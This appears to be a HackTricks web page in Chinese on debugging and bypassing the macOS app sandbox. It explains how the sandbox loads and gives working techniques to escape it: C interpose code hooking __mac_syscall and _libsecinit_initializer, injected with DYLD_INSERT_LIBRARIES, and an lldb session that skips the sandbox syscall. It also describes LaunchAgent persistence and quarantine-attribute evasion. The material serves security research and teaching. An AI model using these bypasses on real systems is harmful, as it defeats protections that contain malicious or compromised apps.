@@ -1,0 +1,491 @@
+<!DOCTYPE HTML>
+<html lang="zh" class="light sidebar-visible" dir="ltr">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>macOS Sandbox Debug &amp; Bypass</title>
+
+
+        <!-- Custom HTML head -->
+
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff">
+
+        <link rel="icon" href="../../../../../favicon.svg">
+        <link rel="shortcut icon" href="../../../../../favicon.png">
+        <link rel="stylesheet" href="../../../../../css/variables.css">
+        <link rel="stylesheet" href="../../../../../css/general.css">
+        <link rel="stylesheet" href="../../../../../css/chrome.css">
+        <link rel="stylesheet" href="../../../../../css/print.css" media="print">
+
+        <!-- Fonts -->
+        <link rel="stylesheet" href="../../../../../FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="../../../../../fonts/fonts.css">
+
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" href="../../../../../highlight.css">
+        <link rel="stylesheet" href="../../../../../tomorrow-night.css">
+        <link rel="stylesheet" href="../../../../../ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+
+
+        <!-- Provide site root to javascript -->
+        <script>
+            var path_to_root = "../../../../../";
+            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
+        </script>
+        <!-- Start loading toc.js asap -->
+        <script src="../../../../../toc.js"></script>
+    </head>
+    <body>
+    <div id="body-container">
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script>
+            try {
+                var theme = localStorage.getItem('mdbook-theme');
+                var sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script>
+            var theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            const html = document.documentElement;
+            html.classList.remove('light')
+            html.classList.add(theme);
+            html.classList.add("js");
+        </script>
+
+        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script>
+            var sidebar = null;
+            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            } else {
+                sidebar = 'hidden';
+            }
+            sidebar_toggle.checked = sidebar === 'visible';
+            html.classList.remove('sidebar-visible');
+            html.classList.add("sidebar-" + sidebar);
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <!-- populated by js -->
+            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
+            <noscript>
+                <iframe class="sidebar-iframe-outer" src="../../../../../toc.html"></iframe>
+            </noscript>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
+                <div class="sidebar-resize-indicator"></div>
+            </div>
+        </nav>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky">
+                    <div class="left-buttons">
+                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </label>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
+                        </ul>
+                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                    </div>
+
+                    <h1 class="menu-title"></h1>
+
+                    <div class="right-buttons">
+                        <a href="../../../../../print.html" title="Print this book" aria-label="Print this book">
+                            <i id="print-button" class="fa fa-print"></i>
+                        </a>
+
+                    </div>
+                </div>
+
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script>
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <h1 id="macos-sandbox-debug--bypass"><a class="header" href="#macos-sandbox-debug--bypass">macOS Sandbox Debug &amp; Bypass</a></h1>
+<p>{% hint style="success" %}
+学习和实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
+学习和实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
+<details>
+<summary>支持 HackTricks</summary>
+<ul>
+<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
+<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>Telegram 群组</strong></a> 或 <strong>关注</strong> 我们的 <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
+<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub 仓库提交 PR 分享黑客技巧。</li>
+</ul>
+</details>
+{% endhint %}
+{% endhint %}
+<h2 id="sandbox-加载过程"><a class="header" href="#sandbox-加载过程">Sandbox 加载过程</a></h2>
+<figure><img src="../../../../../.gitbook/assets/image (901).png" alt=""><figcaption><p>图片来自 <a href="http://newosxbook.com/files/HITSB.pdf">http://newosxbook.com/files/HITSB.pdf</a></p></figcaption></figure>
+<p>在前面的图像中，可以观察到 <strong>当运行具有权限 <strong><code>com.apple.security.app-sandbox</code></strong> 的应用程序时，沙箱将如何加载</strong>。</p>
+<p>编译器将链接 <code>/usr/lib/libSystem.B.dylib</code> 到二进制文件。</p>
+<p>然后，<strong><code>libSystem.B</code></strong> 将调用其他几个函数，直到 <strong><code>xpc_pipe_routine</code></strong> 将应用程序的权限发送到 <strong><code>securityd</code></strong>。Securityd 检查该进程是否应该在沙箱内进行隔离，如果是，它将被隔离。<br />
+最后，沙箱将通过调用 <strong><code>__sandbox_ms</code></strong> 激活，该调用将调用 <strong><code>__mac_syscall</code></strong>。</p>
+<h2 id="可能的绕过方法"><a class="header" href="#可能的绕过方法">可能的绕过方法</a></h2>
+<h3 id="绕过隔离属性"><a class="header" href="#绕过隔离属性">绕过隔离属性</a></h3>
+<p><strong>由沙箱进程创建的文件</strong> 附加了 <strong>隔离属性</strong> 以防止沙箱逃逸。然而，如果你设法 <strong>在沙箱应用程序内创建一个没有隔离属性的 <code>.app</code> 文件夹</strong>，你可以使应用程序包的二进制文件指向 <strong><code>/bin/bash</code></strong> 并在 <strong>plist</strong> 中添加一些环境变量，以利用 <strong><code>open</code></strong> 来 <strong>启动新的未沙箱应用程序</strong>。</p>
+<p>这就是在 <a href="https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html"><strong>CVE-2023-32364</strong></a>** 中所做的**。</p>
+<p>{% hint style="danger" %}
+因此，目前，如果你仅能创建一个名称以 <strong><code>.app</code></strong> 结尾且没有隔离属性的文件夹，你可以逃离沙箱，因为 macOS 只 <strong>检查</strong> <strong><code>.app</code> 文件夹</strong> 和 <strong>主可执行文件</strong> 中的 <strong>隔离</strong> 属性（我们将把主可执行文件指向 <strong><code>/bin/bash</code></strong>）。</p>
+<p>请注意，如果一个 .app 包已经被授权运行（它具有带有授权运行标志的隔离 xttr），你也可以利用它……只是现在你不能在 <strong><code>.app</code></strong> 包内写入，除非你拥有一些特权 TCC 权限（在高沙箱内你将没有这些权限）。
+{% endhint %}</p>
+<h3 id="利用-open-功能"><a class="header" href="#利用-open-功能">利用 Open 功能</a></h3>
+<p>在 <a href="macos-office-sandbox-bypasses.html#word-sandbox-bypass-via-login-items-and-.zshenv"><strong>Word 沙箱绕过的最后示例</strong></a> 中可以看到如何利用 <strong><code>open</code></strong> CLI 功能来绕过沙箱。</p>
+<p>{% content-ref url="macos-office-sandbox-bypasses.md" %}
+<a href="macos-office-sandbox-bypasses.html">macos-office-sandbox-bypasses.md</a>
+{% endcontent-ref %}</p>
+<h3 id="启动代理守护进程"><a class="header" href="#启动代理守护进程">启动代理/守护进程</a></h3>
+<p>即使一个应用程序 <strong>旨在被沙箱化</strong> (<code>com.apple.security.app-sandbox</code>)，如果它 <strong>从 LaunchAgent 执行</strong>（例如 <code>~/Library/LaunchAgents</code>），也可以绕过沙箱。<br />
+正如在 <a href="https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818"><strong>这篇文章</strong></a> 中所解释的，如果你想要在一个沙箱应用程序中获得持久性，你可以使其作为 LaunchAgent 自动执行，并可能通过 DyLib 环境变量注入恶意代码。</p>
+<h3 id="利用自动启动位置"><a class="header" href="#利用自动启动位置">利用自动启动位置</a></h3>
+<p>如果一个沙箱进程可以 <strong>在一个地方写入</strong>，<strong>稍后一个未沙箱应用程序将运行该二进制文件</strong>，它将能够 <strong>通过将二进制文件放置在那里</strong> 来逃离沙箱。这种位置的一个好例子是 <code>~/Library/LaunchAgents</code> 或 <code>/System/Library/LaunchDaemons</code>。</p>
+<p>为此，你可能需要 <strong>2 步</strong>：使一个具有 <strong>更宽松沙箱</strong> (<code>file-read*</code>, <code>file-write*</code>) 的进程执行你的代码，该代码实际上将在一个将 <strong>未沙箱执行</strong> 的地方写入。</p>
+<p>查看关于 <strong>自动启动位置</strong> 的页面：</p>
+<p>{% content-ref url="../../../../macos-auto-start-locations.md" %}
+<a href="../../../../macos-auto-start-locations.html">macos-auto-start-locations.md</a>
+{% endcontent-ref %}</p>
+<h3 id="利用其他进程"><a class="header" href="#利用其他进程">利用其他进程</a></h3>
+<p>如果从沙箱进程中你能够 <strong>妥协其他在限制较少的沙箱中运行的进程</strong>（或没有沙箱），你将能够逃离它们的沙箱：</p>
+<p>{% content-ref url="../../../macos-proces-abuse/" %}
+<a href="../../../macos-proces-abuse/">macos-proces-abuse</a>
+{% endcontent-ref %}</p>
+<h3 id="静态编译与动态链接"><a class="header" href="#静态编译与动态链接">静态编译与动态链接</a></h3>
+<p><a href="https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/"><strong>这项研究</strong></a> 发现了绕过沙箱的两种方法。因为沙箱是在用户空间中应用的，当 <strong>libSystem</strong> 库被加载时。如果一个二进制文件能够避免加载它，它将永远不会被沙箱化：</p>
+<ul>
+<li>如果二进制文件是 <strong>完全静态编译</strong> 的，它可以避免加载该库。</li>
+<li>如果 <strong>二进制文件不需要加载任何库</strong>（因为链接器也在 libSystem 中），它将不需要加载 libSystem。</li>
+</ul>
+<h3 id="shellcodes"><a class="header" href="#shellcodes">Shellcodes</a></h3>
+<p>请注意，<strong>即使是 shellcodes</strong> 在 ARM64 中也需要链接到 <code>libSystem.dylib</code>：</p>
+<pre><code class="language-bash">ld -o shell shell.o -macosx_version_min 13.0
+ld: dynamic executables or dylibs must link with libSystem.dylib for architecture arm64
+</code></pre>
+<h3 id="entitlements"><a class="header" href="#entitlements">Entitlements</a></h3>
+<p>注意，即使某些 <strong>操作</strong> 可能在沙箱中被 <strong>允许</strong>，如果应用程序具有特定的 <strong>权限</strong>，例如：</p>
+<pre><code class="language-scheme">(when (entitlement "com.apple.security.network.client")
+(allow network-outbound (remote ip))
+(allow mach-lookup
+(global-name "com.apple.airportd")
+(global-name "com.apple.cfnetwork.AuthBrokerAgent")
+(global-name "com.apple.cfnetwork.cfnetworkagent")
+[...]
+</code></pre>
+<h3 id="interposting-bypass"><a class="header" href="#interposting-bypass">Interposting Bypass</a></h3>
+<p>有关 <strong>Interposting</strong> 的更多信息，请查看：</p>
+<p>{% content-ref url="../../../macos-proces-abuse/macos-function-hooking.md" %}
+<a href="../../../macos-proces-abuse/macos-function-hooking.html">macos-function-hooking.md</a>
+{% endcontent-ref %}</p>
+<h4 id="interpost-_libsecinit_initializer-以防止沙盒"><a class="header" href="#interpost-_libsecinit_initializer-以防止沙盒">Interpost <code>_libsecinit_initializer</code> 以防止沙盒</a></h4>
+<pre><code class="language-c">// gcc -dynamiclib interpose.c -o interpose.dylib
+
+#include &lt;stdio.h&gt;
+
+void _libsecinit_initializer(void);
+
+void overriden__libsecinit_initializer(void) {
+printf("_libsecinit_initializer called\n");
+}
+
+__attribute__((used, section("__DATA,__interpose"))) static struct {
+void (*overriden__libsecinit_initializer)(void);
+void (*_libsecinit_initializer)(void);
+}
+_libsecinit_initializer_interpose = {overriden__libsecinit_initializer, _libsecinit_initializer};
+</code></pre>
+<pre><code class="language-bash">DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
+_libsecinit_initializer called
+Sandbox Bypassed!
+</code></pre>
+<h4 id="interpost-__mac_syscall-to-prevent-the-sandbox"><a class="header" href="#interpost-__mac_syscall-to-prevent-the-sandbox">Interpost <code>__mac_syscall</code> to prevent the Sandbox</a></h4>
+<p>{% code title="interpose.c" %}</p>
+<pre><code class="language-c">// gcc -dynamiclib interpose.c -o interpose.dylib
+
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+// Forward Declaration
+int __mac_syscall(const char *_policyname, int _call, void *_arg);
+
+// Replacement function
+int my_mac_syscall(const char *_policyname, int _call, void *_arg) {
+printf("__mac_syscall invoked. Policy: %s, Call: %d\n", _policyname, _call);
+if (strcmp(_policyname, "Sandbox") == 0 &amp;&amp; _call == 0) {
+printf("Bypassing Sandbox initiation.\n");
+return 0; // pretend we did the job without actually calling __mac_syscall
+}
+// Call the original function for other cases
+return __mac_syscall(_policyname, _call, _arg);
+}
+
+// Interpose Definition
+struct interpose_sym {
+const void *replacement;
+const void *original;
+};
+
+// Interpose __mac_syscall with my_mac_syscall
+__attribute__((used)) static const struct interpose_sym interposers[] __attribute__((section("__DATA, __interpose"))) = {
+{ (const void *)my_mac_syscall, (const void *)__mac_syscall },
+};
+</code></pre>
+<p>{% endcode %}</p>
+<pre><code class="language-bash">DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
+
+__mac_syscall invoked. Policy: Sandbox, Call: 2
+__mac_syscall invoked. Policy: Sandbox, Call: 2
+__mac_syscall invoked. Policy: Sandbox, Call: 0
+Bypassing Sandbox initiation.
+__mac_syscall invoked. Policy: Quarantine, Call: 87
+__mac_syscall invoked. Policy: Sandbox, Call: 4
+Sandbox Bypassed!
+</code></pre>
+<h3 id="使用-lldb-调试和绕过沙箱"><a class="header" href="#使用-lldb-调试和绕过沙箱">使用 lldb 调试和绕过沙箱</a></h3>
+<p>让我们编译一个应该被沙箱化的应用程序：</p>
+<p>{% tabs %}
+{% tab title="sand.c" %}</p>
+<pre><code class="language-c">#include &lt;stdlib.h&gt;
+int main() {
+system("cat ~/Desktop/del.txt");
+}
+</code></pre>
+<p>{% endtab %}</p>
+<p>{% tab title="entitlements.xml" %}</p>
+<pre><code class="language-xml">&lt;!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"&gt; &lt;plist version="1.0"&gt;
+&lt;dict&gt;
+&lt;key&gt;com.apple.security.app-sandbox&lt;/key&gt;
+&lt;true/&gt;
+&lt;/dict&gt;
+&lt;/plist&gt;
+</code></pre>
+<p>{% endtab %}</p>
+<p>{% tab title="Info.plist" %}</p>
+<pre><code class="language-xml">&lt;plist version="1.0"&gt;
+&lt;dict&gt;
+&lt;key&gt;CFBundleIdentifier&lt;/key&gt;
+&lt;string&gt;xyz.hacktricks.sandbox&lt;/string&gt;
+&lt;key&gt;CFBundleName&lt;/key&gt;
+&lt;string&gt;Sandbox&lt;/string&gt;
+&lt;/dict&gt;
+&lt;/plist&gt;
+</code></pre>
+<p>{% endtab %}
+{% endtabs %}</p>
+<p>然后编译应用程序：</p>
+<p>{% code overflow="wrap" %}</p>
+<pre><code class="language-bash"># Compile it
+gcc -Xlinker -sectcreate -Xlinker __TEXT -Xlinker __info_plist -Xlinker Info.plist sand.c -o sand
+
+# Create a certificate for "Code Signing"
+
+# Apply the entitlements via signing
+codesign -s &lt;cert-name&gt; --entitlements entitlements.xml sand
+</code></pre>
+<p>{% endcode %}</p>
+<p>{% hint style="danger" %}
+该应用程序将尝试<strong>读取</strong>文件**<code>~/Desktop/del.txt</code><strong>，而</strong>Sandbox 不会允许**。<br />
+在这里创建一个文件，因为一旦绕过 Sandbox，它将能够读取它：</p>
+<pre><code class="language-bash">echo "Sandbox Bypassed" &gt; ~/Desktop/del.txt
+</code></pre>
+<p>{% endhint %}</p>
+<p>让我们调试应用程序，以查看沙箱何时加载：</p>
+<pre><code class="language-bash"># Load app in debugging
+lldb ./sand
+
+# Set breakpoint in xpc_pipe_routine
+(lldb) b xpc_pipe_routine
+
+# run
+(lldb) r
+
+# This breakpoint is reached by different functionalities
+# Check in the backtrace is it was de sandbox one the one that reached it
+# We are looking for the one libsecinit from libSystem.B, like the following one:
+(lldb) bt
+* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
+* frame #0: 0x00000001873d4178 libxpc.dylib`xpc_pipe_routine
+frame #1: 0x000000019300cf80 libsystem_secinit.dylib`_libsecinit_appsandbox + 584
+frame #2: 0x00000001874199c4 libsystem_trace.dylib`_os_activity_initiate_impl + 64
+frame #3: 0x000000019300cce4 libsystem_secinit.dylib`_libsecinit_initializer + 80
+frame #4: 0x0000000193023694 libSystem.B.dylib`libSystem_initializer + 272
+
+# To avoid lldb cutting info
+(lldb) settings set target.max-string-summary-length 10000
+
+# The message is in the 2 arg of the xpc_pipe_routine function, get it with:
+(lldb) p (char *) xpc_copy_description($x1)
+(char *) $0 = 0x000000010100a400 "&lt;dictionary: 0x6000026001e0&gt; { count = 5, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REGISTRATION_MESSAGE_SHORT_NAME_KEY\" =&gt; &lt;string: 0x600000c00d80&gt; { length = 4, contents = \"sand\" }\n\t\"SECINITD_REGISTRATION_MESSAGE_IMAGE_PATHS_ARRAY_KEY\" =&gt; &lt;array: 0x600000c00120&gt; { count = 42, capacity = 64, contents =\n\t\t0: &lt;string: 0x600000c000c0&gt; { length = 14, contents = \"/tmp/lala/sand\" }\n\t\t1: &lt;string: 0x600000c001e0&gt; { length = 22, contents = \"/private/tmp/lala/sand\" }\n\t\t2: &lt;string: 0x600000c000f0&gt; { length = 26, contents = \"/usr/lib/libSystem.B.dylib\" }\n\t\t3: &lt;string: 0x600000c00180&gt; { length = 30, contents = \"/usr/lib/system/libcache.dylib\" }\n\t\t4: &lt;string: 0x600000c00060&gt; { length = 37, contents = \"/usr/lib/system/libcommonCrypto.dylib\" }\n\t\t5: &lt;string: 0x600000c001b0&gt; { length = 36, contents = \"/usr/lib/system/libcompiler_rt.dylib\" }\n\t\t6: &lt;string: 0x600000c00330&gt; { length = 33, contents = \"/usr/lib/system/libcopyfile.dylib\" }\n\t\t7: &lt;string: 0x600000c00210&gt; { length = 35, contents = \"/usr/lib/system/libcorecry"...
+
+# The 3 arg is the address were the XPC response will be stored
+(lldb) register read x2
+x2 = 0x000000016fdfd660
+
+# Move until the end of the function
+(lldb) finish
+
+# Read the response
+## Check the address of the sandbox container in SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY
+(lldb) memory read -f p 0x000000016fdfd660 -c 1
+0x16fdfd660: 0x0000600003d04000
+(lldb) p (char *) xpc_copy_description(0x0000600003d04000)
+(char *) $4 = 0x0000000100204280 "&lt;dictionary: 0x600003d04000&gt; { count = 7, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ID_KEY\" =&gt; &lt;string: 0x600000c04d50&gt; { length = 22, contents = \"xyz.hacktricks.sandbox\" }\n\t\"SECINITD_REPLY_MESSAGE_QTN_PROC_FLAGS_KEY\" =&gt; &lt;uint64: 0xaabe660cef067137&gt;: 2\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY\" =&gt; &lt;string: 0x600000c04e10&gt; { length = 65, contents = \"/Users/carlospolop/Library/Containers/xyz.hacktricks.sandbox/Data\" }\n\t\"SECINITD_REPLY_MESSAGE_SANDBOX_PROFILE_DATA_KEY\" =&gt; &lt;data: 0x600001704100&gt;: { length = 19027 bytes, contents = 0x0000f000ba0100000000070000001e00350167034d03c203... }\n\t\"SECINITD_REPLY_MESSAGE_VERSION_NUMBER_KEY\" =&gt; &lt;int64: 0xaa3e660cef06712f&gt;: 1\n\t\"SECINITD_MESSAGE_TYPE_KEY\" =&gt; &lt;uint64: 0xaabe660cef067137&gt;: 2\n\t\"SECINITD_REPLY_FAILURE_CODE\" =&gt; &lt;uint64: 0xaabe660cef067127&gt;: 0\n}"
+
+# To bypass the sandbox we need to skip the call to __mac_syscall
+# Lets put a breakpoint in __mac_syscall when x1 is 0 (this is the code to enable the sandbox)
+(lldb) breakpoint set --name __mac_syscall --condition '($x1 == 0)'
+(lldb) c
+
+# The 1 arg is the name of the policy, in this case "Sandbox"
+(lldb) memory read -f s $x0
+0x19300eb22: "Sandbox"
+
+#
+# BYPASS
+#
+
+# Due to the previous bp, the process will be stopped in:
+Process 2517 stopped
+* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
+frame #0: 0x0000000187659900 libsystem_kernel.dylib`__mac_syscall
+libsystem_kernel.dylib`:
+-&gt;  0x187659900 &lt;+0&gt;:  mov    x16, #0x17d
+0x187659904 &lt;+4&gt;:  svc    #0x80
+0x187659908 &lt;+8&gt;:  b.lo   0x187659928               ; &lt;+40&gt;
+0x18765990c &lt;+12&gt;: pacibsp
+
+# To bypass jump to the b.lo address modifying some registers first
+(lldb) breakpoint delete 1 # Remove bp
+(lldb) register write $pc 0x187659928 #b.lo address
+(lldb) register write $x0 0x00
+(lldb) register write $x1 0x00
+(lldb) register write $x16 0x17d
+(lldb) c
+Process 2517 resuming
+Sandbox Bypassed!
+Process 2517 exited with status = 0 (0x00000000)
+</code></pre>
+<p>{% hint style="warning" %}
+<strong>即使绕过了沙盒，TCC</strong> 仍会询问用户是否允许该进程读取桌面上的文件
+{% endhint %}</p>
+<h2 id="参考文献"><a class="header" href="#参考文献">参考文献</a></h2>
+<ul>
+<li><a href="http://newosxbook.com/files/HITSB.pdf">http://newosxbook.com/files/HITSB.pdf</a></li>
+<li><a href="https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/">https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/</a></li>
+<li><a href="https://www.youtube.com/watch?v=mG715HcDgO8">https://www.youtube.com/watch?v=mG715HcDgO8</a>
+{% hint style="success" %}
+学习和实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
+学习和实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></li>
+</ul>
+<details>
+<summary>支持 HackTricks</summary>
+<ul>
+<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
+<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>Telegram 群组</strong></a> 或 <strong>在 Twitter 上关注</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
+<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub 仓库提交 PR 来分享黑客技巧。</li>
+</ul>
+</details>
+{% endhint %}
+</details>
+{% endhint %}
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+                            <a rel="prev" href="../../../../../macos-hardening/macos-security-and-privilege-escalation/macos-security-protections/macos-sandbox/macos-default-sandbox-debug.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                <i class="fa fa-angle-left"></i>
+                            </a>
+
+                            <a rel="next prefetch" href="../../../../../macos-hardening/macos-security-and-privilege-escalation/macos-security-protections/macos-sandbox/macos-sandbox-debug-and-bypass/macos-office-sandbox-bypasses.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                <i class="fa fa-angle-right"></i>
+                            </a>
+
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                    <a rel="prev" href="../../../../../macos-hardening/macos-security-and-privilege-escalation/macos-security-protections/macos-sandbox/macos-default-sandbox-debug.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
+
+                    <a rel="next prefetch" href="../../../../../macos-hardening/macos-security-and-privilege-escalation/macos-security-protections/macos-sandbox/macos-sandbox-debug-and-bypass/macos-office-sandbox-bypasses.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                        <i class="fa fa-angle-right"></i>
+                    </a>
+            </nav>
+
+        </div>
+
+
+
+
+        <script>
+            window.playground_copyable = true;
+        </script>
+
+
+        <script src="../../../../../elasticlunr.min.js"></script>
+        <script src="../../../../../mark.min.js"></script>
+        <script src="../../../../../searcher.js"></script>
+
+        <script src="../../../../../clipboard.min.js"></script>
+        <script src="../../../../../highlight.js"></script>
+        <script src="../../../../../book.js"></script>
+
+        <!-- Custom JS scripts -->
+
+
+    </div>
+    </body>
+</html>
